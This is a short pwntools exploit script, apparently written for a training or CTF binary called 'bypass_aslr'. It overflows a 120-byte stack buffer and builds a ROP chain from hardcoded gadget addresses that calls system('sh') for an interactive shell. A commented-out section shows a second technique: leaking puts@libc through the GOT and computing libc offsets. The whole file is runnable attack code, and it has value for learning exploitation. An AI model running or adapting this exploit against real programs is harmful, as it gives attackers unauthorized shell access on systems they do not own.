#!/usr/bin/env python3

from pwn import *

#context.update(arch='', os='linux')


# Let's choose local vs remote
p = process("./bypass_aslr") 
#p = remote("127.0.0.1", 4444)

p.recvuntil("> ")

# WE can cause an overflow with 120 bytes + EIP 
payload = b'A'*120

# The intersting part is that we have all the gadgets in the binary 
# We need 
# system address
# shell string ("sh")
# rop gadget "pop rdi; ret"  to put the argument
# rop gadget "ret" to advance on the stack


pop_rdi  = 0x00000000004007f3
ret_add  = 0x0000000000400561
sh       = 0x000000000040085c
system   = 0x0000000000400590

payload +=  p64(pop_rdi)
payload +=  p64(sh)
payload +=  p64(ret_add)
payload +=  p64(system)

p.sendline(payload)
p.interactive()

#######################
# If we didn't have the needed gadgets and strings, we should try to leak the libc address with a double execution
# Sample code to tweak
#######################
#payload +=  p64(pop_rdi)
#payload +=  p64(puts_got)
#payload +=  p64(puts)
#payload +=  p64(main)

#p.recvline()
#output = p.recvline()
#leak = u64(output.strip(b"\n").ljust(8, b"\x00")) 
#log.info('puts@libc is at: {}'.format(hex(leak))) # The leaked value is printed.

#offset_poprdi=
#offset_binsh=
#offset_system = 0x7f11dd61d820  - 0x7f11dd5f2330

#system  = leak - offset_system
#pop_rdi = leak - offset_poprdi
#binsh = leak - offset_binsh

#payload = b'A'*120
#payload += p64(pop_rdi)
#payload += p64(binsh)
#payload += p64(system)
#
#p.recvuntil('> ')
#p.sendline(payload)
#p.interactive()

